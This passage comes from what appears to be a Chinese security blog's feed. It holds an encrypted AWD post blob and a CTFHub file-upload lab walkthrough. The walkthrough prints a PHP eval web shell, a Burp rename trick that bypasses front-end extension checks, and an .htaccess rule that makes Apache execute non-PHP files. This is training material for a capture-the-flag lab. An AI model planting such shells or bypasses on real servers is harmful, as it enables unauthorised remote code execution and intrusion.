b66055c007e6713b865f613846ddd969f6de41f52cda106dacc485c2d3219ef2846da2802542e0e49935be6c6af7e3718246fd39419331084fd7b66af14ec67466ff9a094dc35c1d8e9cf76710542b17ec2b67f3fb5448d0af43f84b7cbb46f20be3f023d4dd3a359761f7e89dbdacc5cbdd1bf36d023a673cfad12a62f3316c7cbefbc9bc1a664ddefab73c755011129ed28c6dde80e2ddc60132d6e687375b864d959f133052fbc7a743d34bd86cdac1382fc401f1f5fb9fe0e859df0a3de5ff136d519853003e24f0571934540298f82ada225c6c4d0262c6031d136f5ce1b0446ab90f514ad464e734ce00287a5a0cac6f1ee76c822f84fe32cc8195d1b2a7837e0f0aa1f2f7222e7b96fc520b29cbf8b233a5cb9d2b80e1a31cf4398e2455896ceb4d3f31f36d75441d631cec4de03954fe962acbb45a3c9026a02570c7312b8f016ad8d731c8c526c501cfaf822205dd8f3e47cc131125f6d60156e6d5d2a9ff575f75290643034827e19851647d10895d782e14146e744c169f6617c70095eb30e7fcc62d48cf1e4a277cee9e55f8128aa003b31b8aea4cd1556cd09232a805b4cd6b6adf740d5687e641ac30451619c47064ff524b154efee43e202d7a45c8647afed9d905b0452a85cd439e3f41b5abc89399908d96add4d464e8d05615dff9c4f5332d06f4c7c0c465405216e806fed127d917bc2c69f797a7bf6779c2a9905a239e55cc4c7a498c5454e8d22b907d3f4c1f0415a2b551a6687d9a3671c4dd1017be71ff2218b7de5c489da4ed4e5ed7cabc21eedb3485f380a141d07429fce9db27fad2152a35046d8eb4d9b9acf6dd79d6792a6490aa780804a47da41f8b58a4fa474c4ecfba4334be2fc83ef46e75ec564335d99e30ff6011dea96edcafc0e13620bb7bb2bc89ccbdbb2e52e23357eb51bcdd24aa7ef5215c5b839ba523bcb8dd9be1ae0fedb3a49022df28bda8d52a1502b9c1f7f253bede43df45d311f0283a2a9157e1404456587ba7d9c8abeb7ca451f22f3f6dabbf1820a05f5406c947a9f15a8e66cb43d8d60def1856b3294543e489ae5c4b53cef16b14ac51c147cea16b4b32c845d97e4efc290c05472dfa850b1bb19c7fa2e4e7762f20400eb05f6a6bd0253f5a668af1226c76f2ac426f444c1ed7202fa2c7d62d363ab21f2f08d988e9465ef9845a4a800f7723ea3d7c34df83f63bdd06654a2992632bff217b4f235492dcecbd4a84ec0a4dd609430dd2354f002d2f27dc7850cf488335f0363b74482143cddd160430669a0df23737973765df8afdbee5e911073edde04080deb92dc137ed3675c260cbdca0f7c719a6fcc35740d914f61abaeb520a66c6e8f7ae662b7bdc0f64f7692b9d408058036fe95326f1cf7e97368ba50ed7876f48b84e06d10809cf918a1e23cda20c99d0d9f262c267352daf2b3302d4d4530a113317dda55e95e1d9533abb5f3a000e4936382b18600834822736c474dfc4e6174220ec31b02b16eb5aa996c67fd29b92cea522bdedca261c3eb02390920a489478ad72a0d3ad532d453dcb5c817bde84689c34fdb042fe225a044ac87da8f487329377d846e73fbf10132322e4ea62e781a23d1e7afaaeec23892c7423fa905347e64c4d1dd714d9350a8559385481e662042e90ce5e131e4359cc2b618e4e7f7fb801195efe6c91dbfc7571d67f8ab3fa45ef5f8d30a980a30b3ec0b276afbc00d24dfe11aeb18aa39186ac95dcece9b8b7fa904965f3d85e4bce58d7115a3fb363cafd1be9229a5a83c1bc922f80c5f32a99f94ae6c2cc8e7433654d7bb5ae5df8c44d12b01081e365704e64789e2c26f781dee3e076b9ee572ade03b9c03112f8b482c2641d42c0fa08ecbd77cdde27785c54c49479f942feea30289a0ae6d4c09b5ef3939b45ccb02bcfe859b6fa7885fce496807327e3aa4a9ef6de7019325b36d56d339673dff6b5df8d65f3119da34e34461dc814b10b8c40944320be16be26a70decda3a42afe76c48da0799c1272de416deab883e994e8a94d12e9e9e00e6d1f6af7db80493c44b95fb3e93735197301906ddb04c0b347c8116a5dde8afe7a742aec3e9334aae4ac4990448396929c98680e12fad26cb3178bf31978196239aa91def148f3f5772800f8ee498d805f4b72a585cfb7743ac126e22a6d7a1f90dec38e887c914ddea7bef91a8bdd31c87cdcb276681398a3e1adccc4b17d1304b75788f7109c4ad5172bfbb24ca85adfe0ed6896886893cf8bbdec2c2609849fb4ed7c05539bc9971c44223784a464022606f67ea8f8cdc7c4622d7f04f434b1238e0e61d5e5307352c175eb5f4348ef80573e8b2d879e63cc0d2d6f4b236831b651f52c2b990447e53947901a9a4221d185ea1918bc47fc9747350c9a473f1f4e83ad99dcebb78e0df1d055def3a52dac74818ed7d2bfd856f7e5e527b913d5f3544103e2e243edc2c58a3c0e5243a279af9c39eaeeb9a11b0e67d77aec08e468a586a24c2b64cb9060c9d1af5d08485a235c185887a3e0014147267e6607004027f72ec78f2e46b8abfcb76a29940141cd8868e27daca1511f7fdbd39709878e161c228bfbd29806f23dfe1f89f0e72ad4f4cb47e69623cf25b844646122583aa703845b04484c57b0eab7c97b6dc752afcc5e4aa4954f097b9c06edc2bbe8332d6dd0d2c92a8407eebdc41c651237aef190447467d5a2aa27a114628d447e2efcba2a33232bc8a29e0ebd34c9e3aaf089bf2bc219dd66e56b176f9f65a978346af31bcf936d6336f7218fb0b7d5eee2c04f7c23e05553a3f9f22a37ce66c597813b5f849c13126cd24ee173d3f6a7f9924adfac71d566e1ecc1fa56db411c7ba7c930104c26415286e1bf58ccbea8086b3f18e3a0924f4aac4f7a57b88463694c196891e21890cb73dded337e4757c9f4abddacda9b8f3cd82dbe945ac6d11137f19cc0a3625a4d8d561b9f5286c9916f89c00936101a3e3df7454ac8471f22565a1b3d3823e4f1679e2eae396d280a0f040c94bbf4c1dbed4e1f3c2db1fdbee7459bd4e853cfcdbf6364055895be9168c7d6858ff67259ac56fc7a81b178d9427a87e0937edd77849d57e8526a8cd3867299df14da43b5ba3be1fa23237b127a7949d848ad31c48ca9ca1f297b25acb275d24f19c57367d5e10b78cb558f8819298be78f78bcdd4fc9269620cb3ef5ffed12bf29ffdeab97339f0bdcf48614c37d8aff34bd9a99f803928d46e7a439f9c14fd57e25299d5864f756f734062e90543e52c36af91f8f1f3bafd81fdd3614d86e0a298b802112f1dd24c2a5281dd6375fbe2c994030dbd75830010a28adfbeca5a0f86bd7c1a4cd42b497df220de618a0c1942ee93981e1c4271c02cf85fa9430648543c8f95b052d93d18ce759f243c5eba72722716a140d309a59acc74aa245e7885d7582d7f0d7fefe8cb21db585778520871f5f91c0c43dcecd3ee77f9d0fb12b6c444279c74089870b760e0e15c71b1ed580b4a6245fbc47ded8b14eac183d1216edc1a2086a34fdb70e6e77fd497bb716c9b704a0653356f1b99f1cfe05094809e5a33f1715d5d081e0cc95637b3a02a565c036c332f75ede6f362e4810f40131da84c0839f703d1573fabcf5dc21b13eb173202e29c435f640085d54a51a73d941996fb0fdb2ef719f1a9fa90f72b0baf4de26e22599df19a92b89b55c8d23c6fe10dc41269b6dc7918b4528d1d26133fcba5e6ee66c557c9a7f4e9cb60ab2cfafee9d3f2554437abe6a8605f47800a28a60f431b2968b274dfc86f58a7f32151603b58841765f67850dd4a67d283a5043bc262f1460b94826bc773e190a54a013de5ce4a6e98f6d4ddc5b59ae19fce6f3b063626045bc42c7f73ec11f78b279a69c24bbaec22e0e93a8b919c65669d26a2b2357331d7611b6000904190a7b7703e5a8f6363f1bb1106413f953460367db19043f35aecc8f909285809f069b070da5ffff3d7833b9074ebdbe00f91f32a3a3f0effa3871dc081476dac16caf98b7d4b1f335f29ecd835399b91b324270e132874dc73a061f25d9e37ca142fc36e034e0e7d461ef4ecb033bc11e320028c1c35613a1d3c170864a1e8270a6a90bc508b5364034d2be8c5b30c41d7c9c88b4eef042297c881e5716375b44c23571992d972f10d0669ce6fcb4cf4ffe5887c0c33861fe17b18fcf17df1e24020bc2583219a42b5c9a6f9e1b5e58ffad7b67aa51dbadf239e03e2408cbe1349b20973fe958a15665fe5aa70ac24fbd8a7126b00e514b884c007d66eed0995eeb2c68333c327ffd6600fd8996696333d791bd42c427287122ce8a20036f188f09d15fa80d75fa0cc3f943150c4492c571a94be2d6013709d9305fe2438a1fb4cd77d8f550ca670e8317c54778ee830f03dc40a57149c567a7a97b92447e789b4da4b67b68ca5b589a0731de8d7313edd106cd033fd0250816915141ff1764925a1fa9c7cee6563277fa7aa533062fe7c9d0556df4724270169d1c8c9a6178a628b39549c995f156365042a411e5a9a5774388c509543981a6503b9aee9bfe3aac49cd4a2d1046e3cd87796fd80aa9bbf54ab7acb21df728258d53e187a46efdfaa8374cac0d0db2f4efb431415deba474daba35604bb9bf79737988464d66a16b743624a3e4b4657e380a5dc0f302246d2b2ce02cd004b8f955fc7925fabbccbd6621d990b5b6c7950c5aa82b02c4057763b6599beb283ef92d99a62c4a3c14c3a57515d43f06bdc30c00544a638ac275ebe08263138a2c23b0af9e13096a184ab550045850dd201de81fa75cf5124fc775c575d59d68f96ca606de04357ed899f24b07eca8c923200031387db340a29307563414d3d3a7245edca912a0777f909b76412864692114fd62241137065437e813952ffc778edc4c874897748ca099747401ae09f098044f389ca5fb8d06c7bd36209b6b2199a54747bddadf1861dbe41e20f262fcd8b0b4d4abf353a4c3c0505900b18e08378c323d8fd60c76432b6e8338f2ffc5ce0aa739fe252958ddd86550fca46d1f65c06a90dae5da85050b7c4737dfe09164bddeae253b013fcc729b68d3ea0ff84d7ee359b09f2d5a4cef83ee004ab553fdbb67214dfac9da19037c31a4a1b8440a54528c07b3b4c40238a38699d13f6937c6efa30307228151b24a73829cafff41c18a2f933bd8b4c63a0a30309ad79ef0b819c1801fe6d5a268a0e655cb51c5605d784270008e230e1f4f25f4c3a88243b0fc545910ccbb8989a1df9c37dee95eff9d8f15a3fe4e84ab4fb504ddb0116dc27b13719d0b1bcea2c48604159daa5bad1f06d5c75be32ffa38ac73709372c365e5285628eab6395c27689e488b7466240ff55319d132877a214c20b24023ccce9a08401f8e6adcf797973700057a440fe62459613d0403feb6cb67d305fc88a0c0f780abe9bbd5eaf8e1e16293336e469de7676b6880d31e2ba404482232f79468f5ba0ba0e3a6638ffa4e4497c4e8be2263e31f4afdeea2f244796cbbf491b7af49c0c7e07fb745fd2f14d67620b32d5a2b89369c2a4c15c7890e420f5485031fb13111678bed1a8ba9ff2b1760299ced8dcb9171f5f03827c30b762fe700923c2744c59ed2d702879bc0d04184dccb80d15e72d23beef2a67f892c00a0da9087cfcafc2c583d34792201a7c3bbff6b25e0cc48207cddde6f574550a6172e1c8a8c5f978496c383f9818a0f67f4cce565869e1add3dec17b00f02bb7bedce80652f697b2fc23dca99584922758e1c60176840daf758e0d5f960f49e5f9bb61358b6c822a50670cfba03c1a13425f62333f5d70ccdad0526a26d6d5cbacd68c19d1ba9e3ea38813cdb39ca4bd70dad9d8d941616bc36f36d2abeb0f78499d1bad2e33eeef4c0e8c1501df320a9d47c3d70fcf5cbb9f69bd9dd7dfce524e52b86c6968ba4cd620c89e9eaa64963d9eca10ed46999593c81ea51c46e5c9df702c863884f6b92a1ed3e8f22390c17006349aa82e844a4dfb855162ae7e969001cfd8c41c61f613018e38f93cddd5dcf24ec2bcbc571a51df3dcfff971f7e6b398f9d1a91c956d3c2f883ddf99c504477539aff08ad8ea6ebe24660e785ae306edea9346bd74cc0625bac4b7092eda7f1a41706d6a9d189e6f3cbac84376e583ae6314992e4d7aa2a6f01bb4ce74be8b88d2110a83761c08b16e65c6e92458047a96f1e08f9acfecb634b9344d018034fe61a859be5a9d9dc800ee79d6d53af1d88ced80d5554962f5b1d9874645c308da8c6c8bd40ee6dd086fe603532c5e6064f5846dc1c48b3aca2915bccdd7b0d73f8e5d842f0d8ee8bb99f94a8215872092cdb1539828a6ffb435eee6751c2975f0b60c36acb8ad049146d8906eaf43522b873a6c4968dd72d8a83ca281c2dc98d78922ae0aaa4ac503c88a0931175defda3b21b41b055d351de9afb9835c1d94de7af7d3aeeb66cb161778ce1800c511d23ae33e9477091740ddf4a205aba5aff7802b0c43287dc6db5c635e50f21008a5dce4287f5227e4745ab04d52446d6f175489d8f712c1bf6b75a3ab24e81f5ea2908846f6249368925a212c34100475cd41aa98ee07c1f909c080a735d8282c9ca5c3f74d4ed10e6db53f209edda618e06f12445eec7432605d56dc14c2a6f4f7c1149a1b390b67b5a6637928357dabf6189bb5c4714962a67bdf19b7dbc8d62da91828b6d5476aa26b70704f6d42f4d5808a1678cdd6a54803d3e698af85b55d0835f6afcc0039e048d572d17ab964616e07104a67b443c2f2c83b27a7e7bb14e1dbe79f3beadee613480453ef4247b3fa2df73aaca20b42255581f4848ef1dd4322c6872b9962ccddf3ff5207f1c1cd9c432911d52905b7446c3e38b50afb90ba00697ee57f021ba35b59b66812dbc549f9544620979e6e12c66c90a713a5b4c2e053e4733ee57de0389531b79393be5bb2989835e682384d67138dc52de3c435e09847f68da44e07fec0a07684d7b0a211cd6a10a1d761c4204b43e9ba32e2af7d81595402d6ab24cc5d7bb85d7fca4faa87d5b7b87db5a2a854eadeb2de9829f69d72b80e4a339568bcb47a2130a38cc0d905910527db483d022ef7d690f316b9d9bc1c594f261bb0406145839be293127733d6cf42abf7e4ab55e4d8452ac393dcf3e3a455992e7ec65d2315a199e211402957b5094c80f111475fa1b2a5f1a212005319dad25a7d8ae8f33ed53a2f0ce76f4d32a4c1b35986530bb515177bf6031f1b32bb6fbd4fdc7f1ab76d580b53144587fd7f8e2d6170b9f4e926212f7eca0b1fda27c3b0005aff6d50dea43ee4506dc1e3e191c934f951bcac454dc18d53c64c2fef1ba7b69e99e3a75621817ebea7a9ccf7f1e9903f60bc43fa37ecbfb5d2b0d8026a5d5861b6c2d198a7663c619468f71e30a49b9802b882829ddf3fb257625b1946f2789bba4ab60e58d72a219d0a8f31c2a1311e7fa2adb03de7545f79676ad2c73e5481d82092280d39e0176e564acabe8dbe84e5498c925b09b534c72a11214030d7806eeafaef614b0fd0e4dbbb27a993ed9bc75d64e6cc997d78988d922a438c9f981d17fb013dd0638859bcf851c6c4af67ab7f71f3827f983bf6715538ad7e85da91d23f6d66cab6516f31dca9529e635ede1dab010c1b2600ca40900ca3c82dd33c3987c7c1c11ccc486150c5ad5038380b1496406ac81753cf3c0d94b389f8895711f4b843e7c71aa393296b10c2466629742c1524a4d100b3b846bd1be64bed825ade8c9bc5224ca1c0a8fa3db77c00ec47b9d19dab23554051224e5653279677975e4fb9d9842374fbb46074fb3c2d2813a67939c7a6e0c4b9f4e45c05a41ea13d9a22ef26b8afcdc8b6e0402f120d3a436044b2fcd798a60a9af89a70ce81b54c6f3492c085ca2ba6f4633970ed72398d1a54523e6e8f0060d80fcdfc4a191a79cec5ebf165a9b298000620db84bee682751228cb352e0f0114e0d4d6be07f2fbca53ab8c981ab261887cbe3bb9546222f0e6a141ef895a13aed51744506ca12ad7dbe8751a53b2cb3a9d5208eaffdc98e5d7fd9dd6869c4edfc9917fafaafd2ab4f9fa5092428c746b7f3372847edffe5fa38cbfcce990ef90215d03e59a3032c568868f006ce00b780d0295ddba6a3a5ed2d8df3718a1013062b8ede5e0e4fcb158491cacb745ce0f26e076c92d2a37d869227ba8f30de6ef39cd0546bd250b12e44f691d5a8be820e26598a2182f64ed631b389d89d8398284c868d52ad0e0fbcb5e446009ff81439f2ae57eed028e0bd2eb87964ccfb5d4c1dc6067033ef2bf2472b5d494b613f53e9eb130f486dc1649b5c6b24530ec23eb00044445eaed2c0045918f7e29e7a7c1a874263ef67375595d5bc1dc35fb83ef3a08d188eec9eaa98147a17cbe5bd572c6890c3783f53c6e43c6decfae0c597131f8b4a0c4b467a5c5532d269f72aca091380c172de44c0349e2ea4e2535f2fc2336325fc8dd6d00bc171da394847a63cf68f83decb828536d44e89d899f000974e5663c3f39c8b7dc6bd5751606e899d4637bdd919a1f4707a6f75caa989e4d25f0e0442d5b0fa56da46fd59f6df99e072e84a61fb2a2cf80b721d068301a22e182805fa4a854cbda1860fe8b85554eb3b61fc64b7ceb22b00833d27ab8298d52383af063409bda44ac8dd5fb66b1ae56bd8651720b4ad4b047e2be60a17c9356da1bbb7c39afd5a92853426cd8db9c46d956ce02b05cfb644644dd282af80080f850a47c31d72d936b3f62937d8083deafc218450ca2962d108736033376edf1027bb211e92216ed12067b9d3d4844bfd0469f0ce06f493a77514ff3570d5314d5bb90cec9afcfe288cfc46b2c99e040166b4a42118e447c74519d8531fc8cb4f8354e05b92bd48f69c3be2cc1947bc684a6da627d408babef061dc81c02deaa8163731ba5104bf00e0541247fec02158077ca588c73ca0282eaa7d24aab852e36ffd1de052908b6eb034d023971a1fbb759a54484b5fe64ca2270e674ada77bce9d2ba240a57eb83574baec7785e73d0272b17e7524028a65811b103ddcd3167261f1514043bacaa5d04a4fb7a76db85bc96089e95ace5f48b2b8095dc524725b89ca01ed2349eaf1fea4eab9409222fa84a66541029ba578d63ec660ce50cfa29f3bb4fb19886d0647621763b01b44cef675d82538802899744e23e0fb7f5cac74ef151746449cf910162f9424a566172b3de9ca6c5682bf888dc9f72bd3ba442275df106529481fc2a537ae0830e61cc856ee3c14fe9d2cfb4ced20249abff999235e1cfe3a872809977d4665a254e14ba0bfba8a20ad0b9b45d816b033f7edfa19229dfa9d254f1ff9900b130cf7f61267a26baad5a2e0c4c42eb4d3a3972c1d706aaf72a9a3c7dbde860b46b24b1374b917de537b154574fd22ae096b61b750e7d6e238bf4fa194a9834279a515f963d5ded4ec2f427fbac299f2977e8a5c7d6b1ae915cffc922c6a2214adb795a9bc085c4b5d0a5f05d3aab81b175ac8b430ff49acc4c3bff842f86d81d5d2953dfeb7006547f80123d62ef7c659ac68de709c41c6b79ca334fbc9932622ad6d0dae9c83a7e59ed1836d0ea348db9f317de42a66ca07cd7c54e5c8b819c43a917cc189053d7203eb804f979dca1ece3f3a481e77f7d54c9e4ca1e9ebcdb0fc39c3bb57dc0ba2ce8092f02f83bb4211cedb4f501bd99b7f6d67da808d2bfcdda4f8dba17c5f08bb67861bcf1b935129b3f47f5abfd73ea96970367c0d1fe1a2e24be9532b94508fcd155431bb28f5f8abfdfeb7c303fa5f973724ba09295a2ff6225822124b746b2072f411c30be785a3728f82c82369efb40b1a1d1f15e04af1e9a44108ce67d4477d787215a536ae03b5206224b86f38ce2b06bf9b5c9dc0e4ccab498683f94121e5922887788b730c2c4fdf48fe9a4d72645dafc01f0180cf7f468aac37a39190bcff5ef7b7954bbbbda3aa40c04d21a81db7622b71f6f715074206dfbcb7a41ee064be6dae14b3cc2eae8e0ae02b29ddacb4f24242073e69355f36d8634a8e0dc6e89cf2b8bf8bd59c99f70637f5c7ca4fd214ca246fb80408137e5e067680e0adec296af1d9fd3c967186371fa1d7879f5cd09c813af962a74de06706e8b9bc775d219bb871d04327ecdae6f6add9dfde5222a6affe2c408f69694158e73e23a9e91f086570c9b2968e9089d2aa27acf46e00ecb8c9ecfc6ee108728c741af779443481779aea4c0afce7bd57ca7a965fc427ab7f1e5a255754c7e920a962e8da5f438cb31eda690b5700e63052fc525eb6090da6f1304345dd4d78f34a4dcafae301263e7e805fd473e868bfad6719d016584b50c8fc44b912f006243d80d48e816b921484435fe43333708d9a2f0eee3b4e1b9949d53cc10c2f6031b80c4f851c6d0ca723e93f15cf54af10e2b438f6a0787f641573eb22b1da54707d087b44709eb47765dde9fddcba366e10a5537e93bc51ccc92af8afcbd671d3c81696d5254f9fb5e3e0aecf3fcb2d61c2b87273076b38a131bd8347b9f2aee74b2becf3a6d788370fa4a5f400d1ebaf5873733d4ca6f6021a0651815c8b8c1a7605bf7a9a74fd8b6aac526954ad61b2ff3e1a2ab0797c1390a8030bbc940ddae7cccc569383022e8f9511f6d4631706f40a73764d008c9953bc29af4db05acc5b0e0eeef24b12cb1bc2a2856d49f9150a4ef9bff9cefc9c3de9578a1e00734d0abf0e61b5bb3e3d7bd7d84e126e484fac2ce83ea4052770e82271bc52f237724e26c832f03d924f9ccf932a45a4b7299ad3c2f7a536aed20f6b3b60243b8ee42d5193973b25dbfbddb30cf9832ca3c56701a195c26842843cdcd4ab501ef3135704cbbaa8bdb898ba4f298b0cc6d4a48045ea169e8ab88d34f89448beece67de69d5a8078a7e492b34145e668e48337e43ab6ae4a747acf999c6328953d8c5aacf561dfc0a1bd912102638d60e496b40f0fe8d423edbfefb7b22e8b3db6bef2f9d4405e7dc80172684b891d47b7dc53815677c2b65fdad8208d631cb74c8f18019eedcdb0978bae24bd9592a82a575d3d275d7ca771eebf3ae69ba4566dbd3a9223cef2383f277c843b05b4fb8c2d85909b08e21db0d9afb6c3b8a899eff9cdd2bb8c6b78f3087c13d35bbbaf11a39c77f7181e4c01b1204824bb2ca76cc3b8dc225d6f6263f2757c7c7c769ed0a5ab51f5cc56d6f5332884db4e307a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇受密码保护的文章，您需要提供访问密码：</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="AWD" scheme="http://atkx.top/categories/CTF/AWD/"/>
    
    
    <category term="AWD" scheme="http://atkx.top/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-文件上传练习</title>
    <link href="http://atkx.top/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
    <id>http://atkx.top/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</id>
    <published>2020-11-22T11:46:56.000Z</published>
    <updated>2021-04-04T14:02:23.418Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（三）</p> <a id="more"></a><h2 id="0x00-无验证"><a href="#0x00-无验证" class="headerlink" title="0x00 无验证"></a>0x00 无验证</h2><p><img src="https://img-blog.csdnimg.cn/2020111821051990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>上传文件相对路径<code>upload/1.php</code><br><img src="https://img-blog.csdnimg.cn/20201118210615644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用蚁剑连接，连接密码为<code>pass</code><br><img src="https://img-blog.csdnimg.cn/20201118210744773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看目录，flag就在这里<br><img src="https://img-blog.csdnimg.cn/20201118210930972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x01-前端验证"><a href="#0x01-前端验证" class="headerlink" title="0x01 前端验证"></a>0x01 前端验证</h2><p><img src="https://img-blog.csdnimg.cn/20201118211350400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，结果提示该文件不允许上传<br><img src="https://img-blog.csdnimg.cn/2020111821132240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>题目是前端验证，直接查看网页源代码，发现只能上传<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种格式的文件<br><img src="https://img-blog.csdnimg.cn/20201118211703499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>把1.php改为1.jpg，然后上传抓包</p><p><img src="https://img-blog.csdnimg.cn/20201118212718468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.jpg再改为1.php，然后放包<br><img src="https://img-blog.csdnimg.cn/20201118213046598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到相对路径upload/1.php<br><img src="https://img-blog.csdnimg.cn/2020111821314576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还是一样的操作，蚁剑连接，查找目录，找到flag<br><img src="https://img-blog.csdnimg.cn/20201118213340365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x03-htaccess"><a href="#0x03-htaccess" class="headerlink" title="0x03 .htaccess"></a>0x03 .htaccess</h2><p>题目描述：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>访问<br><img src="https://img-blog.csdnimg.cn/2020111822095844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码，发现文件后缀都被禁用了<br><img src="https://img-blog.csdnimg.cn/2020111822110957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度一下hatccess文件，<code>.htaccess</code>是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</p><p><code>.hatccess</code>文件有两种写法</p><p><strong>第一种方法:</strong><br>下面代码的意思是，只要文件名中包含pass，就会被Apache解析为php文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;FilesMatch <span class="hljs-string">&quot;pass&quot;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>提示文件名不能为空，命名为<code>3.hatccess</code>,用bp抓包，将3.htaccess改为<code>.htaccass</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/2020111912484428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><code>.htaccass</code>文件上传成功<br><img src="https://img-blog.csdnimg.cn/20201119124911563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>把上面用到的1.php改为3.pass文件，上传文件相对路径<code>upload/3.pass</code><br><img src="https://img-blog.csdnimg.cn/20201119125620833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，可以看到上传的文件<br><img src="https://img-blog.csdnimg.cn/20201119125123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查找flag<br><img 